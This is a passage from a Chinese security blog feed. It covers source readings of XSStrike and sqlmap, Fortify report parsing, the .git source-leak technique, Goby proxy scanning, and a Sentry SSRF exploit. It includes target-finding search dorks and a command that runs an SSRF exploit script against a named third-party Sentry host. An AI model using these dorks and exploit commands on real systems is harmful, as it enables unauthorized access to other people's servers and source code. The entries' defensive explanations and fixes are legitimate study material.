<p>判断输出点是否在标签里面,找出xsschecker所在的标签  如<code>&lt;input name=keyword  value=&quot;v3dm0s&quot;&gt;</code></p>
</li>
<li class="lvl-3">
<p>遍历标签 如 <code>['&lt;input', 'name=keyword', '', 'value=&quot;v3dm0s&quot;&gt;']'</code></p>
</li>
<li class="lvl-3">
<p>找出输出点的环境信息:</p>
<ul class="lvl-2">
<li class="lvl-6">是在什么标签里 (如<code>input</code>)</li>
<li class="lvl-6">由什么符号包裹 (单引号、双引号、顿号)</li>
<li class="lvl-6">输出点的类型是什么?(参数名or参数值)</li>
</ul>
</li>
</ol>
<hr />
<h3 id="输出点在html中">输出点在html中:</h3>
<p>示例:</p>
<p><img src="https://i.loli.net/2019/07/14/5d2b3c73d09d963919.png" alt="" /></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(position_and_context) &lt; reflections:</span><br><span class="line">    html_context = re.finditer(xsschecker, clean_response)</span><br><span class="line">    <span class="keyword">for</span> occurence <span class="keyword">in</span> html_context:</span><br><span class="line">        thisPosition = occurence.start()</span><br><span class="line">        <span class="keyword">if</span> thisPosition <span class="keyword">not</span> <span class="keyword">in</span> position_and_context:</span><br><span class="line">            position_and_context[occurence.start()] = <span class="string">&#x27;html&#x27;</span> <span class="comment"># html</span></span><br><span class="line">            environment_details[thisPosition] = &#123;&#125;</span><br><span class="line">            environment_details[thisPosition][<span class="string">&#x27;details&#x27;</span>] = &#123;&#125;</span><br></pre></td></tr></table></figure>
<p>无过多处理,就是个正则匹配</p>
<hr />
<h3 id="输出点在注释中">输出点在注释中:</h3>
<p>示例:</p>
<p>无</p>
<p>源码:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(position_and_context) &lt; reflections:</span><br><span class="line">    comment_context = re.finditer(<span class="string">r&#x27;&lt;!--(?![.\s\S]*--&gt;)[.\s\S]*(%s)[.\s\S]*?--&gt;&#x27;</span> % xsschecker, response)</span><br><span class="line">    <span class="keyword">for</span> occurence <span class="keyword">in</span> comment_context:</span><br><span class="line">        thisPosition = occurence.start(<span class="number">1</span>)</span><br><span class="line">        position_and_context[thisPosition] = <span class="string">&#x27;comment&#x27;</span>  <span class="comment"># 注释</span></span><br><span class="line">        environment_details[thisPosition] = &#123;&#125;</span><br><span class="line">        environment_details[thisPosition][<span class="string">&#x27;details&#x27;</span>] = &#123;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>无过多处理,就是个正则匹配</p>
<hr />
<h3 id="标记无法执行的环境">标记无法执行的环境:</h3>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">bad_contexts = re.finditer(</span><br><span class="line">    <span class="string">r&#x27;(?s)(?i)&lt;(style|template|textarea|title|noembed|noscript)&gt;[.\s\S]*(%s)[.\s\S]*&lt;/\1&gt;&#x27;</span> % xsschecker, response) <span class="comment"># 正则匹配 标记无法执行的输出</span></span><br><span class="line">non_executable_contexts = []</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> bad_contexts:</span><br><span class="line">    non_executable_contexts.append([each.start(), each.end(), each.group(<span class="number">1</span>)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> non_executable_contexts:</span><br><span class="line">    <span class="keyword">for</span> key <span class="keyword">in</span> database.keys():</span><br><span class="line">        position = database[key][<span class="string">&#x27;position&#x27;</span>]</span><br><span class="line">        badTag = isBadContext(position, non_executable_contexts)</span><br><span class="line">        <span class="keyword">if</span> badTag:</span><br><span class="line">            database[key][<span class="string">&#x27;details&#x27;</span>][<span class="string">&#x27;badTag&#x27;</span>] = badTag</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            database[key][<span class="string">&#x27;details&#x27;</span>][<span class="string">&#x27;badTag&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">return</span> database</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在以下标签内,为不可执行的环境.</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>style</code></p>
</li>
<li class="lvl-2">
<p><code>template</code></p>
</li>
<li class="lvl-2">
<p><code>textarea</code></p>
</li>
<li class="lvl-2">
<p><code>title</code></p>
</li>
<li class="lvl-2">
<p><code>noembed</code></p>
</li>
<li class="lvl-2">
<p><code>noscript</code></p>
</li>
</ul>
<hr />
<h1>总结:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>解析请求参数(前提)</p>
</li>
<li class="lvl-2">
<p>对参数值进行无害字符串替换,发包</p>
</li>
<li class="lvl-2">
<p>在返回包源码中搜索输出点</p>
</li>
<li class="lvl-2">
<p>标记输出点的上下文环境</p>
</li>
</ul>
<p>上下文环境实例:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;<span class="number">455</span>: &#123;<span class="string">&#x27;position&#x27;</span>: <span class="number">455</span>, <span class="string">&#x27;context&#x27;</span>: <span class="string">&#x27;attribute&#x27;</span>, <span class="string">&#x27;details&#x27;</span>: &#123;<span class="string">&#x27;tag&#x27;</span>: <span class="string">&#x27;input&#x27;</span>, <span class="string">&#x27;type&#x27;</span>: <span class="string">&#x27;value&#x27;</span>, <span class="string">&#x27;quote&#x27;</span>: <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;value&#x27;</span>: <span class="string">&#x27;v3dm0s&#x27;</span>, <span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;value&#x27;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>position</code>:表示输出点在页面中的第几个字符处</p>
</li>
<li class="lvl-2">
<p><code>context</code>: 输出位置点的执行环境(<code>script</code>,<code>attribute</code>,<code>html</code>,<code>comment</code>等)</p>
</li>
<li class="lvl-2">
<p><code>details</code>: 执行环境的具体信息</p>
<ul class="lvl-2">
<li class="lvl-6"><code>tag</code>: 输出点在什么标签(<code>div</code>,<code>a</code>,<code>input</code>等)</li>
<li class="lvl-6"><code>type</code>: 输出点是参数名还是参数值(<code>name</code>, <code>value</code>)</li>
<li class="lvl-6"><code>quote</code>: 输出点是用什么包裹起来的(单引号,双引号,`号)</li>
<li class="lvl-6"><code>value</code>: 参数值</li>
<li class="lvl-6"><code>name</code>: 参数名</li>
</ul>
</li>
</ul>
<hr />
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://juejin.im/entry/58f43b0c61ff4b0058fd734d">跨站的艺术 - XSS Fuzzing 的技巧</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.freebuf.com/articles/web/191003.html">利用XSStrike Fuzzing XSS漏洞</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/he_and/article/details/84593067">XSStrike源码阅读（1）——目录结构与大体架构</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/he_and/article/details/84660755">XSStrike源码阅读（2）——四种模式</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/he_and/article/details/84886282">XSStrike源码阅读（3）——核心函数</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SourceCodeReading</category>
      </categories>
      <tags>
        <tag>SourceCodeReading</tag>
      </tags>
  </entry>
  <entry>
    <title>fortify结果解析</title>
    <url>/2020/50872.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>Goal:使用<code>fortify</code>扫描完后,需要导出并解析它的结果。</p>
<hr />
<h1>工具ReportGenerator:</h1>
<p><code>ReportGenerator.bat</code></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200727143418.png" alt="20200727143418" /></p>
<p>使用该工具可以设置模板、导出指定格式的报告.</p>
<p>任务参数:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200727143603.png" alt="20200727143603" /></p>
<p>解析有3种格式:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>pdf</p>
</li>
<li class="lvl-2">
<p>rtf</p>
</li>
<li class="lvl-2">
<p>xml</p>
</li>
</ul>
<p>此处,我选了xml的格式。</p>
<hr />
<h1>xml解析:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721102113.png" alt="20200721102113" /></p>
<p>整体分成3部分:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>Report Overview 报告总览</p>
<ul class="lvl-2">
<li class="lvl-4">Report Summary 报告摘要</li>
<li class="lvl-4">Issue Summary by Fortify Priority Order 问题摘要(根据优先级排序)</li>
</ul>
</li>
<li class="lvl-2">
<p>Issue Summary 问题摘要</p>
<ul class="lvl-2">
<li class="lvl-4">Overall number of results 结果总数</li>
<li class="lvl-4">Issues By Category 类别问题</li>
</ul>
</li>
<li class="lvl-2">
<p>Results Outline 结果概要</p>
<ul class="lvl-2">
<li class="lvl-4">Vulnerability Examples by Category 按类别列出的漏洞示例</li>
</ul>
</li>
</ul>
<hr />
<h1>第一部分-Report Overview报告总览:</h1>
<h2 id="Report-Summary-报告摘要">Report Summary 报告摘要</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721102635.png" alt="20200721102635" /></p>
<p>对应于</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721104903.png" alt="20200721104903" /></p>
<h2 id="Issue-Summary-by-Fortify-Priority-Order-问题摘要-根据优先级排序">Issue Summary by Fortify Priority Order 问题摘要(根据优先级排序)</h2>
<p>每个级别的统计数据</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721103449.png" alt="20200721103449" /></p>
<p>filter set选择<code>Security Auditor View</code>后,对应于<code>Audit Workbench</code>这里的数据</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721103529.png" alt="20200721103529" /></p>
<hr />
<h1>第二部分-Issue Summary问题摘要:</h1>
<h2 id="Overall-number-of-results结果总数">Overall number of results结果总数:</h2>
<p>问题总数<br />
<img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721105039.png" alt="20200721105039" /></p>
<p>对应于</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200727144734.png" alt="20200727144734" /></p>
<hr />
<h2 id="Issues-By-Category类别问题">Issues By Category类别问题:</h2>
<p>问题分类统计</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721105254.png" alt="20200721105254" /></p>
<p>对应于</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200721105400.png" alt="20200721105400" /></p>
<hr />
<h1>第三部分:Results Outline 结果概要</h1>
<p>Vulnerability Examples by Category 按类别列出的漏洞示例</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200727144915.png" alt="20200727144915" /></p>
<p>对应于:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200727145912.png" alt="20200727145912" /></p>
<hr />
<h1>其他:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20200727143959.png" alt="20200727143959" /></p>
<p>默认的模板对列出的风险有个数的限制,我们要自定义模板，才可以导出所有的风险。</p>
<p>做法可参考<a href="https://stackoverflow.com/questions/33288065/how-do-i-generate-a-report-that-has-all-the-issues">how-do-i-generate-a-report-that-has-all-the-issues</a></p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>HPE_SCA_Guide_17.20.pdf</p>
</li>
<li class="lvl-2">
<p><a href="https://stackoverflow.com/questions/33288065/how-do-i-generate-a-report-that-has-all-the-issues">how-do-i-generate-a-report-that-has-all-the-issues</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/yingshang/banruo">banruo</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>git源码泄露exploit</title>
    <url>/2019/30513.html</url>
    <content><![CDATA[<h1>gitHack工作原理:</h1>
<h2 id="寻找测试目标">寻找测试目标:</h2>
<p>google hack <code>&quot;index of /.git&quot;</code></p>
<h2 id="解析元数据">解析元数据:</h2>
<p><code>/.git/index</code>的作用:</p>
<blockquote>
<p>The index is a single, large, binary file in <baseOfRepo>/.git/index, which lists all files in the current branch, their sha1 checksums, time stamps and the file name</p>
</blockquote>
<p>通过<code>gin</code>这个工具去解析index文件</p>
<p>解析结果:</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d70f29f95.jpg" alt="" /></p>
<h2 id="下载文件">下载文件:</h2>
<p>通过上面获得的<code>sha1</code>来构造url:</p>
<p>.git/objects/<code>sha前两位</code>/<code>sha后两位之后的内容</code></p>
<p>对返回的数据进行<code>zlib</code>解压就可以下载到文件了</p>
<h1>危害:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://threatpost.com/open-git-directories-leave-390k-websites-vulnerable/137299/">Open .Git Directories Leave 390K Websites Vulnerable</a></p>
</li>
</ul>
<h1>修复方案:</h1>
<p>对<code>.git</code>目录限制,不对外访问</p>
<h1>漏洞原因:</h1>
<p>开发人员通常会使用版本控制工具来管理代码,在上线的服务器上的根目录上使用简单的git操作就可以很方便的更新、管理代码。</p>
<p>版本控制工具在带来便利的同时,由于开发人员的疏忽,导致出现源代码安全的问题</p>
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://github.com/lijiejie/GitHack">GitHack</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.jianshu.com/p/edae09535ea3">如何利用.git文件夹下载整个网站泄漏的源码</a></p>
</li>
<li class="lvl-2">
<p><a href="https://threatpost.com/open-git-directories-leave-390k-websites-vulnerable/137299/">Open .Git Directories Leave 390K Websites Vulnerable</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>goby配置socks5代理进行扫描</title>
    <url>/2020/35805.html</url>
    <content><![CDATA[<h1>pre:</h1>
<p>需求:需要从办公网和测试网段出发，去扫描生产的es 9200端口,看是否有未授权访问的问题</p>
<p>为了方便，打算通过配置代理的方式，用办公机去进行扫描</p>
<hr />
<h1>配置代理:</h1>
<p>在一台测试网段的服务器上,确认了80端口是和我的办公网电脑通的。</p>
<p>利用该端口进行代理</p>
<hr />
<h2 id="socks5服务端配置">socks5服务端配置:</h2>
<p>在服务端上配置socks5服务端:</p>
<p><a href="https://github.com/woodyxiong/TinySocks5">TinySocks5</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python main.py -p 80</span><br></pre></td></tr></table></figure>
<hr />
<h2 id="goby配置">goby配置:</h2>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201112112541.png" alt="20201112112541" /></p>
<p>然后就可以进行扫描了</p>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>nyawc框架-解析不了网页里的链接的分析</title>
    <url>/2019/40639.html</url>
    <content><![CDATA[<h1>Pre:</h1>
<p>用<code>nyawc</code>框架,试图爬取该url<code>http://atmos.sysu.edu.cn/</code>里的文档类型链接的时候,发现爬取不到.</p>
<p>比如</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d712ac5eb.jpg" alt="" /></p>
<p>通过<code>python</code>模拟发包请求该url<code>http://atmos.sysu.edu.cn/article/2005</code></p>
<p>发现返回包里没有<code>doc</code>链接.</p>
<hr />
<h1>Debug思路1:</h1>
<p>猜测: <code>nyawc</code>处理不了无后缀的url(eg.<code>http://atmos.sysu.edu.cn/article/2005</code>)</p>
<p>该网站可能是隐藏了网页的后缀.也就是对url进行了重写即<code>url rewrite</code></p>
<hr />
<h2 id="URL重写">URL重写:</h2>
<h2 id="什么是URL重写">什么是URL重写</h2>
<p>如果您正在给银行写信，您可能会打开文字处理程序并创建一个名为的文件<code>lettertobank.doc</code>。该文件可能位于您的Documents目录中，其中包含完整路径<code>C:/Windows/users/julie/Documents/lettertobank.doc</code>。一个文件路径=一个文档(<strong><code>One file path = one document</code></strong>).</p>
<p>同样，如果您要创建一个银行网站，您可以创建一个名为的页面page1.html，上传它，然后将浏览器指向。一个URL =一个资源(<strong><code>One URL = one resource</code></strong>)。在这种情况下，资源是物理网页，但它也可以是从CMS中提取的页面或产品。</p>
<p>URL重写会改变这一切。它允许您将URL与资源完全分开。</p>
<p>通过URL重写，您可以将用户带到<code>…/page1.html</code>或去<code>…/about-us/</code>或去<code>…/about-this-website-and-me/</code>或去<code>…/youll-never-find-out-about-me-hahaha-Xy2834/</code>。或者所有这些。它有点像硬盘上的快捷方式或符号链接。一个URL =查找资源的一种方法(<strong><code>One URL = one way to find a resource.</code></strong>)。</p>
<p><strong>通过URL重写，URL和它所引导的资源可以完全相互独立</strong>。</p>
<p>实际上，它们通常不是完全独立的：URL通常包含一些代码或数字或名称，使CMS能够查找资源。但从理论上讲，这就是URL重写所提供的：<strong>完全分离</strong>。</p>
<hr />
<h3 id="为什么要重写URL">为什么要重写URL:</h3>
<p>对于网站来说:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>隐藏网站实现细节</p>
</li>
<li class="lvl-2">
<p>有利于<code>SEO</code>,复杂的url地址会对网页的收录造成影响</p>
</li>
</ul>
<p>例如:<code>http://www.prof…co.uk/products/brown-miniflo-gutter-148/</code>,URL本身包含搜索词中的单词.</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d713de4f8.jpg" alt="" /></p>
<p>对于用户来说:</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>让url看起来更简洁、更容易输入和记住</p>
</li>
</ul>
<hr />
<h3 id="如何重写URL">如何重写URL:</h3>
<p>是否可以在网站上实现URL重写主要取决于Web服务器</p>
<p>几乎所有服务器都支持,比如</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>Java</code>可以通过<code>web.xml</code>配置</p>
</li>
<li class="lvl-2">
<p><code>PHP</code>可以通过模板引擎配置</p>
</li>
<li class="lvl-2">
<p><code>Apache</code> 有专门的 <code>module</code> 等等</p>
</li>
</ul>
<hr />
<h4 id="例子-3">例子:</h4>
<p>通过<code>Apache</code>配置的例子:</p>
<ol>
<li class="lvl-3">
<p>开启<code>apache</code> <code>Rewrite_mod</code>模块。</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">LoadModule rewrite_module modules/mod_rewrite.so</span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>在配置文件末尾添加虚拟主机配置</p>
</li>
<li class="lvl-3">
<p>新建<code>.htaccess</code>文件,添加规则</p>
<p>eg1:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RewriteRule ^([a-zA-Z]+)\/([a-zA-Z0-9]+)\.shtml$ $1.php?id=$2 [L]</span><br></pre></td></tr></table></figure>
<p><code>http://www.test.test/test/3.shtml</code> 对应实际的Url地址为：<code>http://www.test.test/test.php?id=3</code></p>
<p>eg2:</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">RewriteRule ^room_(.*)$ room.php?id=$1 [NC]</span><br></pre></td></tr></table></figure>
<p><code>http://localhost/room_123/</code> 对应的Url地址为: <code>http://localhost/room.php?id=123</code></p>
</li>
</ol>
<hr />
<h1>Debug思路2:</h1>
<p>抓包分析,比较浏览器请求的包与用<code>python</code>模拟发的包.</p>
<hr />
<h2 id="浏览器抓包的实际请求">浏览器抓包的实际请求:</h2>
<p><img src="https://i.loli.net/2019/04/25/5cc1d71524169.jpg" alt="" /></p>
<p>在获取我们需要的内容(第三个包)前,必须执行一个js请求.</p>
<hr />
<h2 id="模拟发的包">模拟发的包:</h2>
<p>发现第一个包的请求的状态码是<code>202</code>,也就是上面图的第一个包.</p>
<hr />
<h2 id="结论">结论:</h2>
<p>这种要执行js请求才能获取得到的返回包,一般要使用无头浏览器才能解决得了.</p>
<hr />
<h1>总结:</h1>
<h2 id="原因-2">原因:</h2>
<p>这个问题是 <strong>发送了正确的请求,但是没有获得正确的返回结果</strong>.</p>
<p>获取不到预期的返回包(含doc链接),是因为在这之前还必须要有个js请求,这种请求用模拟发包一般是实现不了的,除非再花时间理解那个js文件,再模拟js的请求.</p>
<p>如果这样处理就会有点麻烦,一般这种情况,上无头浏览器是比较通用的解决办法.</p>
<hr />
<h2 id="错误的debug思路">错误的debug思路:</h2>
<p>一开始debug的思路是不正确的,没有经过细致的排查,猜测的依据也只是根据印象,有点想当然了.</p>
<p>自己在调用<code>nyawc</code>框架的时候,是有做跟url后缀处理相关的请求.</p>
<p>不过这个处理只是过滤掉一些提前预设的静态url,如<code>&quot;gif&quot;, &quot;jpg&quot;, &quot;png&quot;, &quot;jpeg&quot;, &quot;woff&quot;, &quot;ttf&quot;, &quot;eot&quot;, &quot;svg&quot;, &quot;woff2&quot;, &quot;ico&quot;</code>,然后过滤掉这些url,不对这些url发送新的请求.</p>
<p>而我的猜测的依据 就是看到这个url<code>http://atmos.sysu.edu.cn/article/2005</code>是个无后缀的Url,就简单猜测,并把问题定位在: <code>nyawc</code>处理不了无后缀的url.</p>
<p>这个问题定位过于宽泛了.因为</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>后缀的处理是请求前的问题</p>
</li>
<li class="lvl-2">
<p>解析链接是请求后的问题</p>
</li>
</ul>
<hr />
<h2 id="正确的debug思路">正确的debug思路:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p>请求前: <strong>后缀处理是否有问题?</strong></p>
</li>
<li class="lvl-2">
<p>请求中: <strong>是否请求到了正确的页面?并获得正确的返回结果?</strong></p>
<ul class="lvl-2">
<li class="lvl-6">一般的爬虫问题,获取不到预期的结果.最直接的办法还是比较浏览器请求的包与用<code>python</code>模拟发的包</li>
<li class="lvl-6">如果发的包不同,那就是请求前的问题.如果发的包都相同，那就是请求后处理的问题.</li>
</ul>
</li>
<li class="lvl-2">
<p>请求后: <strong>获得正确的返回结果后,是否能解析到?</strong></p>
</li>
</ul>
<hr />
<h2 id="改进">改进:</h2>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>nyawc</code>这个爬虫框架还是有点局限的.可能后续要增加爬虫能力的话,还是要考虑上无头浏览器.</p>
</li>
<li class="lvl-2">
<p>Debug要定位问题的时候,范围不能过于宽泛.排查的步骤不能漏.要能排列组合、没有交集的列出一二三.</p>
</li>
<li class="lvl-2">
<p>要多看源码,理解要更深入.</p>
</li>
</ul>
<hr />
<h1>其他:</h1>
<p>设置brupsuite截取js请求.</p>
<p><img src="https://i.loli.net/2019/04/25/5cc1d716322e4.jpg" alt="" /></p>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.smashingmagazine.com/2011/11/introduction-to-url-rewriting/">URL重写简介</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.zhihu.com/question/20282238">很多网站上的登陆页面等为什么没有后缀名？比如diandian/register却没有.html等？</a></p>
</li>
<li class="lvl-2">
<p><a href="http://www.itfuns.com/201.html">隐藏PHP后缀名的几种方法</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>SecurityTools</category>
      </categories>
      <tags>
        <tag>SecurityTools</tag>
      </tags>
  </entry>
  <entry>
    <title>sentry SSRF</title>
    <url>/2020/12497.html</url>
    <content><![CDATA[<h1>范围</h1>
<p>一般在url上看到到有sentry都可以用Sentry（是一个实时事件日志记录和聚合平台）的exp试试，原理是由于sentry默认开启source code scrapping ，导致可以从外部进行blind ssrf请求。</p>
<hr />
<h1>百度dork:</h1>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201118102259.png" alt="20201118102259" /></p>
<hr />
<h1>exp测试步骤:</h1>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python3 sentrySSRF.py -i https://sentry.tpxventures.com/auth/login/technomedia/ -d</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201118102724.png" alt="20201118102724" /></p>
<p>brup collaborator收到请求</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201118102843.png" alt="20201118102843" /></p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20201118102924.png" alt="20201118102924" /></p>
<hr />
<h1>修复方式</h1>
<ol>
<li class="lvl-3">
<p>sentry关闭 source code scrapping；</p>
</li>
<li class="lvl-3">
<p>保证配置文件中的黑名单不为空：/sentry/conf/server.py</p>
</li>
</ol>
<hr />
<h1>refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://www.cnblogs.com/mysticbinary/p/12979368.html">sentry SSRF</a></p>
</li>
<li class="lvl-2">
<p><a href="https://hackerone.com/reports/374737">https://hackerone.com/reports/374737</a></p>
</li>
<li class="lvl-2">
<p><a href="https://github.com/xawdxawdx/sentrySSRF">https://github.com/xawdxawdx/sentrySSRF</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>WebSecurity</category>
      </categories>
      <tags>
        <tag>WebSecurity</tag>
      </tags>
  </entry>
  <entry>
    <title>sqlmap源码-参数动态性检测</title>
    <url>/2020/490.html</url>
    <content><![CDATA[<h1>参数动态性检测:</h1>
<p>直接抄一下别人的流程图:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/024A031F-AB6F-4E2F-BFD3-7FEB419DA68A.png" alt="" /></p>
<p>其实很简单,简而言之</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>将请求参数值替换成一个随机的四位数，发包获取结果</p>
</li>
<li class="lvl-2">
<p>结果与原始页面做相似度的对比</p>
</li>
<li class="lvl-2">
<p>如果不相似,那么这个参数具有动态性(这个参数的变化导致了页面的变化)</p>
</li>
</ul>
<hr />
<h1>代码:</h1>
<p>实际的代码也是很少。(如果在理解了页面相似度这个概念的前提下)</p>
<p>在开始检测的sql注入的<code>start()</code>函数有调用到<code>checkDynParam</code>函数</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/7653A023-2E37-4DAA-953B-2D704694060A.png" alt="" /></p>
<p>经过这个检测参数动态性的函数之后,就可以看到熟悉的提示了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[23:16:00] [INFO] testing if GET parameter &#x27;id&#x27; is dynamic</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">checkDynParam</span>(<span class="params">place, parameter, value</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    This function checks if the URL parameter is dynamic. If it is</span></span><br><span class="line"><span class="string">    dynamic, the content of the page differs, otherwise the</span></span><br><span class="line"><span class="string">    dynamicity might depend on another parameter.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> kb.redirectChoice:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">    kb.matchRatio = <span class="literal">None</span></span><br><span class="line">    dynResult = <span class="literal">None</span></span><br><span class="line">    randInt = randomInt() <span class="comment"># 生成一个四位随机数</span></span><br><span class="line"></span><br><span class="line">    paramType = conf.method <span class="keyword">if</span> conf.method <span class="keyword">not</span> <span class="keyword">in</span> (<span class="literal">None</span>, HTTPMETHOD.GET, HTTPMETHOD.POST) <span class="keyword">else</span> place <span class="comment"># paramType:&#x27;GET&#x27;</span></span><br><span class="line"></span><br><span class="line">    infoMsg = <span class="string">&quot;testing if %s parameter &#x27;%s&#x27; is dynamic&quot;</span> % (paramType, parameter)</span><br><span class="line">    logger.info(infoMsg) <span class="comment"># 输出提示信息</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        payload = agent.payload(place, parameter, value, getUnicode(randInt)) <span class="comment"># payload: u&#x27;id=__PAYLOAD_DELIMITER__1412__PAYLOAD_DELIMITER__&#x27;</span></span><br><span class="line">        dynResult = Request.queryPage(payload, place, raise404=<span class="literal">False</span>) <span class="comment"># 这里面会发包,并且判断相似度</span></span><br><span class="line">    <span class="keyword">except</span> SqlmapConnectionException:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    result = <span class="literal">None</span> <span class="keyword">if</span> dynResult <span class="keyword">is</span> <span class="literal">None</span> <span class="keyword">else</span> <span class="keyword">not</span> dynResult</span><br><span class="line">    kb.dynamicParameter = result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>
<p>函数功能注释也解释了。</p>
<p>这个函数用于测试参数是否是动态的。如果它是动态的话，(替换成一个新的值之后)那么页面的内容会发生变化。</p>
<p>如果这个参数不是动态的，那么动态性可能要取决于别的参数。</p>
<hr />
<h1>inspire:</h1>
<p>在实际的渗透测试时，用brupsuite抓包的时候，会有这种感觉。</p>
<p>不知道对哪个参数下手，不知道对哪个参数的值替换成payload进行测试。</p>
<p>如果随机测了某个，又不知道其他的参数会不会漏。</p>
<p>但是如果了解了 <strong>参数动态性</strong> 这个概念之后,实际上这个问题可以转化为</p>
<p>这个数据包里面的哪些参数是动态的，也就是我修改了这个参数之后，服务端会拿对这个变化的参数进行处理，以致于页面(返回包)会发送变化。</p>
<p>那么很大可能性是 我这个参数影响到了某个sql语句的查询或者执行了。</p>
<p>那么这个参数就很有可能存在注入。</p>
<p><strong>总结一下，一个参数存在注入的前提是 这个参数具有动态性。</strong></p>
<blockquote>
<p>那么是不是可以编写一个brupsuite插件或者一个小工具，对数据包的参数批量的先检测它是否具有动态性,毕竟这个是注入的前提之一。</p>
</blockquote>
<hr />
<h1>refs：</h1>
